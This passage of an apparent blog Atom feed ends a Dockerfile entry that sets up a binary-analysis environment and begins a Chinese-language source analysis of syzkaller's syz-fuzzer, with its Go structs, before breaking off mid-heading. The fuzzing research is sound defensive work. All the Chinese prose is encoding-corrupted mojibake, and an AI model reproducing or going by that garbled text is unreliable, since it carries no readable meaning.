\</span><br><span class="language-bash">    angr \</span><br><span class="language-bash">    pebble \</span><br><span class="language-bash">    r2pipe</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> pwndbg &amp;&amp; <span class="hljs-built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿™ä¸€æ—¥ï¼ŒDocker å†å…¥æ¡Œé¢ GUI å¢ƒç•Œ&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="è¿ç»´" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Docker" scheme="https://arttnba3.github.io/tags/Docker/"/>
    
    <category term="GUI" scheme="https://arttnba3.github.io/tags/GUI/"/>
    
    <category term="Wayland" scheme="https://arttnba3.github.io/tags/Wayland/"/>
    
  </entry>
  
  <entry>
    <title>ã€FUZZ.0x03ã€‘syzkaller - IIIï¼šsyz-fuzzer æºç åˆ†æ</title>
    <link href="https://arttnba3.github.io/2023/09/27/FUZZ-0X03-SYZKALLER-III_SOURCE_SYZFUZZER/"/>
    <id>https://arttnba3.github.io/2023/09/27/FUZZ-0X03-SYZKALLER-III_SOURCE_SYZFUZZER/</id>
    <published>2023-09-26T15:26:14.000Z</published>
    <updated>2023-12-30T20:05:18.821Z</updated>
    
    <content type="html"><![CDATA[<p>ï¼ˆæ‘˜ä¸‹çœ¼é•œï¼‰Furryï¼Ÿï¼ˆæˆ´ä¸Šçœ¼é•œï¼‰Fuzzerï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>åœ¨<a href="https://arttnba3.cn/2023/03/02/FUZZ-0X02-SYZKALLER-II_SOURCE_SYZMANAGER/">ä¸Šä¸€ç¯‡æ–‡ç« </a>å½“ä¸­æˆ‘ä»¬åˆ†æäº† syzkaller ä¸‰å¤§ç»„ä»¶å½“ä¸­çš„ syz-manager çš„æºç ï¼Œæœ¬ç¯‡æ–‡ç« æˆ‘ä»¬ç»§ç»­æ¥åˆ†æ syz-fuzzer çš„æºç </p><p>ä¸ syz-manager æ‰€ä¸åŒçš„æ˜¯ï¼Œsyz-fuzzer ä½äº Guest VM å½“ä¸­ï¼Œ<strong>æœ¬è´¨ä¸Šæ¶µç›–äº†ä¸€ä¸ªä¼ ç»Ÿ fuzzer çš„æ‰€æœ‰åŸºæœ¬åŠŸèƒ½</strong>ï¼šè¾“å…¥ç”Ÿæˆä¸å˜å¼‚ã€å¯åŠ¨æ–°è¿›ç¨‹ï¼ˆsyz-executorï¼‰æ‰§è¡Œè¾“å…¥ã€è·å–è¦†ç›–ç‡ä¿¡æ¯â€¦</p><p>åœ¨ syz-fuzzer è¿è¡Œè¿‡ç¨‹ä¸­å…¶ä¼šé€šè¿‡ RPC è°ƒç”¨ syz-manager ä¸­çš„éƒ¨åˆ†å‡½æ•°ï¼Œå› æ­¤æœ¬ç¯‡ä¹Ÿä¼šåˆ†æä¸Šç¯‡æ‰€æœªæ¶‰åŠåˆ°çš„ syz-manager ä¸­çš„ä¸€äº›å‡½æ•°ï¼šï¼‰</p><blockquote><p>è¿™ä¸€ç³»åˆ—æ–‡ç« ç¡®å®é¸½äº†æŒºä¹…äº†ï¼Œä½†æœ€è¿‘ç¡®å®æ˜¯æ¯”è¾ƒå¿™æ²¡å•¥æ—¶é—´å†™åšå®¢ï¼ˆè¿™ä¸€ç¯‡å…¶å®ä¹‹å‰å¤§è‡´çš„åˆç¨¿å°±å†™å¥½äº†ï¼Œä½†æ˜¯åé¢åˆé¸½æ‰äº†â€¦ï¼‰ï¼Œä¸çŸ¥é“ä¸‹ä¸€ç¯‡ä¼šæ˜¯ä»€ä¹ˆæ—¶å€™äº† XD</p></blockquote><h1 id="0x01-åŸºæœ¬ç»“æ„ä½“"><a href="#0x01-åŸºæœ¬ç»“æ„ä½“" class="headerlink" title="0x01. åŸºæœ¬ç»“æ„ä½“"></a>0x01. åŸºæœ¬ç»“æ„ä½“</h1><p>ç›¸æ¯”äºç›´æ¥å¼€å§‹ä¸€å¤´é›¾æ°´åœ°åˆ†ææºç ï¼Œç¬”è€…è®¤ä¸ºè¿˜æ˜¯æœ‰å¿…è¦åœ¨æ­¤ä¹‹å‰å…ˆåˆ—å‡ºä¸€äº›åŸºæœ¬çš„ç»“æ„ä½“ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠè¿™ä¸€èŠ‚å½“æˆä¸€ä¸ªè¡¨æ¥æŸ¥ ï¼šï¼‰</p><h2 id="Fuzzing-è¿‡ç¨‹ç›¸å…³"><a href="#Fuzzing-è¿‡ç¨‹ç›¸å…³" class="headerlink" title="Fuzzing è¿‡ç¨‹ç›¸å…³"></a>Fuzzing è¿‡ç¨‹ç›¸å…³</h2><h3 id="1-Syscallï¼šå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬ä¿¡æ¯"><a href="#1-Syscallï¼šå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬ä¿¡æ¯" class="headerlink" title="1. Syscallï¼šå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬ä¿¡æ¯"></a>1. Syscallï¼šå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬ä¿¡æ¯</h3><p>syzkaller <strong>ä»¥ç³»ç»Ÿè°ƒç”¨ä¸ºåŸºæœ¬è¾“å…¥å•ä½</strong>ï¼Œå®šä¹‰äº <code>prog/types.go</code> ä¸­çš„ <code>Syscall</code> ç»“æ„ä½“è¢«ç”¨æ¥è¡¨ç¤ºå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬ä¿¡æ¯ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Syscall <span class="hljs-keyword">struct</span> &#123;<br>ID          <span class="hljs-type">int</span><br>NR          <span class="hljs-type">uint64</span> <span class="hljs-comment">// kernel syscall number</span><br>Name        <span class="hljs-type">string</span><br>CallName    <span class="hljs-type">string</span><br>MissingArgs <span class="hljs-type">int</span> <span class="hljs-comment">// number of trailing args that should be zero-filled</span><br>Args        []Field<br>Ret         Type<br>Attrs       SyscallAttrs<br><br>inputResources  []*ResourceDesc<br>outputResources []*ResourceDesc<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ç¼–å†™ syzlang æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºç³»ç»Ÿè°ƒç”¨<a href="https://arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/#call-attributes">æ·»åŠ ä¸€äº›å±æ€§</a>ï¼Œè¿™è¢«å°è£…äºå†…åµŒåœ¨ <code>Syscall</code> é‡Œçš„ <code>SyscallAttrs</code> ç»“æ„ä½“ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// SyscallAttrs è¡¨ç¤º syzlang çš„è°ƒç”¨å±æ€§.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// è¯¥ç»“æ„ä¸ºç³»ç»Ÿæ‰€æœ‰å…¶ä»–éƒ¨åˆ†çš„ source of truth.</span><br><span class="hljs-comment">// pkg/compiler ä½¿ç”¨è¯¥ç»“æ„å¯¹æè¿°è¿›è¡Œè¯­æ³•åˆ†æ.</span><br><span class="hljs-comment">// syz-sysgen ä½¿ç”¨è¯¥ç»“æ„ä¸º executor ç”Ÿæˆä»£ç .</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// ç›®å‰ä»…æ”¯æŒ `bool`s ä¸ `uint64`s.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// å¯¹äºç‹¬ç«‹å±æ€§çš„æè¿°ï¼Œå‚è§ docs/syscall_descriptions_syntax.md </span><br><span class="hljs-keyword">type</span> SyscallAttrs <span class="hljs-keyword">struct</span> &#123;<br>Disabled      <span class="hljs-type">bool</span><br>Timeout       <span class="hljs-type">uint64</span><br>ProgTimeout   <span class="hljs-type">uint64</span><br>IgnoreReturn  <span class="hljs-type">bool</span><br>BreaksReturns <span class="hljs-type">bool</span><br>NoGenerate    <span class="hljs-type">bool</span><br>NoMinimize    <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ChoiceTableï¼šç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨"><a href="#2-ChoiceTableï¼šç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨" class="headerlink" title="2. ChoiceTableï¼šç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨"></a>2. ChoiceTableï¼šç³»ç»Ÿè°ƒç”¨ç”Ÿæˆä¼˜å…ˆçº§è¡¨</h3><p>å®šä¹‰äº <code>prog/prio.go</code> ä¸­çš„ <code>ChoiceTable</code> æ˜¯ syz-fuzzer ä¸­éå¸¸æ ¸å¿ƒçš„ä¸€ä¸ªç»“æ„ï¼Œå…¶ç”¨äºè¡¨ç¤º<strong>å¯¹äºç»™å®šçš„ç³»ç»Ÿè°ƒç”¨ xï¼Œåœ¨æ·»åŠ å…¥ç³»ç»Ÿè°ƒç”¨ y åï¼Œä»£ç è¦†ç›–ç‡ä¼šä¸Šå‡çš„å¯èƒ½æ€§</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ChooseTableï¼ˆè¯‘æ³¨ï¼šåŸæ–‡å¦‚æ­¤ï¼‰å…è®¸å¯¹ç»™å®šçš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œ</span><br><span class="hljs-comment">// å¯¹ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¿›è¡Œä¸€æ¬¡æƒé‡é€‰æ‹©ï¼Œè¿™åŸºäºè°ƒç”¨åˆ°è°ƒç”¨çš„ä¼˜å…ˆçº§ä¸å¼€å¯&amp;å¯ç”Ÿæˆçš„ç³»ç»Ÿè°ƒç”¨é›†åˆ</span><br><span class="hljs-keyword">type</span> ChoiceTable <span class="hljs-keyword">struct</span> &#123;<br>target          *Target<span class="hljs-comment">/* ç›®æ ‡æ¶æ„ä¿¡æ¯ */</span><br>runs            [][]<span class="hljs-type">int32</span> <span class="hljs-comment">/* ä¼˜å…ˆçº§è¡¨ */</span><br>calls           []*Syscall <span class="hljs-comment">/* ç³»ç»Ÿè°ƒç”¨ä¿¡æ¯ */</span><br>noGenerateCalls <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>  <span class="hljs-comment">/* ä¸ç”¨äºè¾“å…¥ç”Ÿæˆçš„ç³»ç»Ÿè°ƒç”¨å· */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜å…ˆçº§æƒé‡å€¼å­˜æ”¾åœ¨äºŒç»´æ•°ç»„ <code>run</code> ä¸­ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªä¼˜å…ˆçº§ä¸º<strong>ç´¯åŠ å€¼</strong>ï¼Œä¾‹å¦‚æœ‰ç»™å®šçš„ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨ Aã€Bã€Cï¼Œæœ‰è¿™æ ·çš„ä¸€ä¸ªç”Ÿæˆä¼˜å…ˆçº§è¡¨ <code>prios</code>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆåœ¨ <code>run</code> è¡¨ä¸­åˆ™ä¼šå°†ä¸€åˆ—çš„ç»“æœé€ä¸ªåŠ èµ·æ¥ï¼Œä»è€Œæœ‰è¿™æ ·çš„ä¸€ä¸ªç»“æœï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšç¬”è€…ä¹Ÿä¸çŸ¥é“ ï¼š(</p><h3 id="3-weightsï¼šæƒé‡"><a href="#3-weightsï¼šæƒé‡" class="headerlink" title="3. weightsï¼šæƒé‡"></a>3. weightsï¼šæƒé‡</h3><p>å®šä¹‰äº <code>prog/prio.go</code> ä¸­çš„ <code>weights</code> ç»“æ„ä½“ç”¨äºè¡¨ç¤ºã€ç›®æ ‡ç³»ç»Ÿè°ƒç”¨çš„æƒé‡ã€‘ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> weights <span class="hljs-keyword">struct</span> &#123;<br>call  <span class="hljs-type">int</span> <span class="hljs-comment">/* ç³»ç»Ÿè°ƒç”¨å· */</span><br>in    <span class="hljs-type">int32</span>  <span class="hljs-comment">/* ä»¥è¯¥ç³»ç»Ÿè°ƒç”¨ä½œä¸ºè¾“å…¥çš„æƒé‡å€¼ï¼Ÿ */</span><br>inout <span class="hljs-type">int32</span>  <span class="hljs-comment">/* ä»¥è¯¥ç³»ç»Ÿè°ƒç”¨ä½œä¸ºè¾“å‡ºçš„æƒé‡å€¼ï¼Ÿ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Callï¼šç”¨ä½œè¾“å…¥çš„å•ä¸ªç³»ç»Ÿè°ƒç”¨"><a href="#4-Callï¼šç”¨ä½œè¾“å…¥çš„å•ä¸ªç³»ç»Ÿè°ƒç”¨" class="headerlink" title="4. Callï¼šç”¨ä½œè¾“å…¥çš„å•ä¸ªç³»ç»Ÿè°ƒç”¨"></a>4. Callï¼šç”¨ä½œè¾“å…¥çš„å•ä¸ªç³»ç»Ÿè°ƒç”¨</h3><p>syzkaller çš„ fuzzing ä»¥ syscall ä¸ºå•ä½ï¼Œ<code>Syscall</code> ç»“æ„ä½“ç”¨äºè¡¨ç¤ºå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬ä¿¡æ¯ï¼Œ<code>Call</code> ç»“æ„ä½“åˆ™è¡¨ç¤º<strong>å¸¦æœ‰å‚æ•°çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨</strong>ï¼Œæ˜¯ syzkaller ä¸­æ‰€è°“çš„æœ€å°è¾“å…¥å•ä½</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Call <span class="hljs-keyword">struct</span> &#123;<br>Meta    *Syscall<br>Args    []Arg<br>Ret     *ResultArg<br>Props   CallProps<br>Comment <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ArgCtxï¼šå¸¦ä¸Šä¸‹æ–‡çš„å‚æ•°"><a href="#5-ArgCtxï¼šå¸¦ä¸Šä¸‹æ–‡çš„å‚æ•°" class="headerlink" title="5. ArgCtxï¼šå¸¦ä¸Šä¸‹æ–‡çš„å‚æ•°"></a>5. ArgCtxï¼šå¸¦ä¸Šä¸‹æ–‡çš„å‚æ•°</h3><p>ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ç”¨ <code>Arg</code> æ¥å£è¡¨ç¤ºï¼Œ <code>ArgCtx</code> ä¸ºå®ç°äº†è¯¥æ¥å£çš„å¸¦æœ‰ä¸Šä¸‹æ–‡çš„ä¸€ä¸ªå‚æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ArgCtx <span class="hljs-keyword">struct</span> &#123;<br>Parent *[]Arg      <span class="hljs-comment">// GroupArg.Inner (for structs) or Call.Args containing this arg.</span><br>Fields []Field     <span class="hljs-comment">// Fields of the parent struct/syscall.</span><br>Base   *PointerArg <span class="hljs-comment">// Pointer to the base of the heap object containing this arg.</span><br>Offset <span class="hljs-type">uint64</span>      <span class="hljs-comment">// Offset of this arg from the base.</span><br>Stop   <span class="hljs-type">bool</span>        <span class="hljs-comment">// If set by the callback, subargs of this arg are not visited.</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-Progï¼šå•ä¸ªè¾“å…¥ç¨‹åº"><a href="#6-Progï¼šå•ä¸ªè¾“å…¥ç¨‹åº" class="headerlink" title="6. Progï¼šå•ä¸ªè¾“å…¥ç¨‹åº"></a>6. Progï¼šå•ä¸ªè¾“å…¥ç¨‹åº</h3><p>é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬å¹¶ä¸ä»…ä»¥ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä½œä¸ºè¾“å…¥ï¼Œè€Œæ˜¯ä»¥<strong>ä¸€ç»„ç³»ç»Ÿè°ƒç”¨åºåˆ—</strong>ä½œä¸ºè¾“å…¥å•ä½â€”â€”å³ä¸€ä¸ª<strong>ç¨‹åº</strong>ï¼Œè¿™ä¹Ÿæ˜¯ syzkaller ä¸­<strong>å®è´¨ä¸Šçš„æœ€å°è¾“å…¥å•ä½</strong>ï¼Œåœ¨ syz-fuzzer å½“ä¸­ä½¿ç”¨ <code>Prog</code> ç»“æ„ä½“æ¥è¡¨ç¤º<strong>å•ä¸ªè¾“å…¥</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Prog <span class="hljs-keyword">struct</span> &#123;<br>Target   *Target <span class="hljs-comment">/* ç›®æ ‡æ¶æ„ä¿¡æ¯ */</span><br>Calls    []*Call <span class="hljs-comment">/* ç³»ç»Ÿè°ƒç”¨åºåˆ— */</span><br>Comments []<span class="hljs-type">string</span>  <span class="hljs-comment">/* æ³¨é‡Šï¼Ÿ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-Candidateï¼šåºåˆ—åŒ–çš„å•ä¸ªè¾“å…¥é¡¹"><a href="#6-Candidateï¼šåºåˆ—åŒ–çš„å•ä¸ªè¾“å…¥é¡¹" class="headerlink" title="6. Candidateï¼šåºåˆ—åŒ–çš„å•ä¸ªè¾“å…¥é¡¹"></a>6. Candidateï¼šåºåˆ—åŒ–çš„å•ä¸ªè¾“å…¥é¡¹</h3><p>æˆ‘ä»¬é€šå¸¸ä¼šæœ‰å¤šä¸ª syz-fuzzer è¿›ç¨‹ä¸ VMï¼Œè€Œæˆ‘ä»¬æ›´å¸Œæœ›<strong>åœ¨ fuzzer ä¹‹é—´å…±äº«é‚£äº›æœ‰ç”¨çš„è¾“å…¥</strong>ï¼Œè¿™é€šå¸¸é€šè¿‡ <code>syz-fuzzer</code> å‘ <code>syz-manager</code> å‘èµ· RPC <code>poll()</code> æ¥å®Œæˆâ€”â€”<code>candidate</code> ç”¨ä»¥è¡¨ç¤º<strong>åºåˆ—åŒ–åçš„è¾“å…¥</strong>ï¼Œä»è€Œæ–¹ä¾¿åœ¨ä¸åŒ è¿›ç¨‹é—´ä¼ é€’ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Candidate <span class="hljs-keyword">struct</span> &#123;<br>Prog      []<span class="hljs-type">byte</span><span class="hljs-comment">/* åºåˆ—åŒ–åçš„ç¨‹åº */</span><br>Minimized <span class="hljs-type">bool</span><span class="hljs-comment">/* æ˜¯å¦æœ€å°åŒ–ï¼Ÿ */</span><br>Smashed   <span class="hljs-type">bool</span><span class="hljs-comment">/* æ˜¯å¦è¦æ‰“ç¢é‡ç»„ï¼Ÿ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-CallInfoï¼šå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¿è¡Œç»“æœ"><a href="#7-CallInfoï¼šå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¿è¡Œç»“æœ" class="headerlink" title="7. CallInfoï¼šå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¿è¡Œç»“æœ"></a>7. CallInfoï¼šå•ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¿è¡Œç»“æœ</h3><p>æ‰§è¡Œå®Œç¨‹åºä¹‹åæˆ‘ä»¬è‡ªç„¶æƒ³è¦çŸ¥é“ç¨‹åºçš„æ‰§è¡Œç»“æœï¼Œåœ¨ syz-fuzzer å½“ä¸­ä½¿ç”¨ <code>CallInfo</code> ç»“æ„ä½“è¡¨ç¤º<strong>å•ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œç»“æœ</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> CallInfo <span class="hljs-keyword">struct</span> &#123;<br>Flags  CallFlags<br>Signal []<span class="hljs-type">uint32</span> <span class="hljs-comment">// åé¦ˆä¿¡å·, è‹¥è®¾ç½®äº† FlagSignal åˆ™å¡«å……</span><br>Cover  []<span class="hljs-type">uint32</span> <span class="hljs-comment">// æ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¦†ç›–ç‡, è‹¥è®¾ç½®äº† FlagSignal ä¸” cover == true åˆ™å¡«å……,</span><br><span class="hljs-comment">// if dedup == false, åˆ™ cov å®é™…ä¸ŠåŒ…å«äº†ä¸€ä¸ª trace, å¦åˆ™é‡å¤é¡¹è¢«åˆ é™¤</span><br>Comps prog.CompMap <span class="hljs-comment">// æ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ¯”è¾ƒæ“ä½œæ•°</span><br>Errno <span class="hljs-type">int</span>          <span class="hljs-comment">// è°ƒç”¨çš„ errno (è‹¥è°ƒç”¨æˆåŠŸåˆ™ä¸º 0)</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>CompMap</code> ä¸ºä¸€ä¸ªäºŒé‡æ˜ å°„ <code>uint64 â†’ ã€uint64 â†’ boolã€‘</code> ï¼Œæˆ‘ä»¬å°†åœ¨åæ–‡è§£é‡Šè¿™ä¸ªä¸œè¥¿ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Example: for comparisons &#123;(op1, op2), (op1, op3), (op1, op4), (op2, op1)&#125;</span><br><span class="hljs-comment">// this map will store the following:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//m = &#123;</span><br><span class="hljs-comment">//op1: &#123;map[op2]: true, map[op3]: true, map[op4]: true&#125;,</span><br><span class="hljs-comment">//op2: &#123;map[op1]: true&#125;</span><br><span class="hljs-comment">//&#125;.</span><br><span class="hljs-keyword">type</span> CompMap <span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">uint64</span>]<span class="hljs-type">bool</span><br></code></pre></td></tr></table></figure><h3 id="8-ProgInfoï¼šå•ä¸ªç¨‹åºçš„è¿è¡Œç»“æœ"><a href="#8-ProgInfoï¼šå•ä¸ªç¨‹åºçš„è¿è¡Œç»“æœ" class="headerlink" title="8. ProgInfoï¼šå•ä¸ªç¨‹åºçš„è¿è¡Œç»“æœ"></a>8. ProgInfoï¼šå•ä¸ªç¨‹åºçš„è¿è¡Œç»“æœ</h3><p>syzkaller ä¸­å•æ¬¡è¿è¡Œçš„æœ€å°ç²’åº¦å…¶å®æ˜¯ç”±ä¸€ç»„ç³»ç»Ÿè°ƒç”¨æ„æˆçš„ä¸€ä¸ªç¨‹åºï¼Œå› æ­¤ç¨‹åºçš„è¿è¡Œç»“æœå¾ˆè‡ªç„¶åœ°å°±æ˜¯ç”±ä¸€ç»„ <code>CallInfo</code> æ„æˆï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ProgInfo <span class="hljs-keyword">struct</span> &#123;<br>Calls []CallInfo<br>Extra CallInfo <span class="hljs-comment">// stores Signal and Cover collected from background threads</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-Envï¼šsyz-executor-çš„æ‰§è¡Œç¯å¢ƒä¿¡æ¯"><a href="#9-Envï¼šsyz-executor-çš„æ‰§è¡Œç¯å¢ƒä¿¡æ¯" class="headerlink" title="9. Envï¼šsyz-executor çš„æ‰§è¡Œç¯å¢ƒä¿¡æ¯"></a>9. Envï¼šsyz-executor çš„æ‰§è¡Œç¯å¢ƒä¿¡æ¯</h3><p> <code>Env</code> ç»“æ„ä½“ç”¨æ¥è®°å½• syz-executor çš„æ‰§è¡Œç¯å¢ƒä¿¡æ¯ï¼Œå¦‚è¾“å…¥ã€è¾“å‡ºã€æ‰§è¡Œçš„å‘½ä»¤è¡Œç­‰ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br>in  []<span class="hljs-type">byte</span><br>out []<span class="hljs-type">byte</span><br><br>cmd       *command<br>inFile    *os.File<br>outFile   *os.File<br>bin       []<span class="hljs-type">string</span><br>linkedBin <span class="hljs-type">string</span><br>pid       <span class="hljs-type">int</span><br>config    *Config<br><br>StatExecs    <span class="hljs-type">uint64</span><br>StatRestarts <span class="hljs-type">uint64</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="10-WorkTriage-x2F-WorkCandidate-x2F-WorkSmash-ï¼šå®é™…çš„å•ä¸ªè¾“å…¥é¡¹"><a href="#10-WorkTriage-x2F-WorkCandidate-x2F-WorkSmash-ï¼šå®é™…çš„å•ä¸ªè¾“å…¥é¡¹" class="headerlink" title="10. WorkTriage&#x2F;WorkCandidate&#x2F;WorkSmash 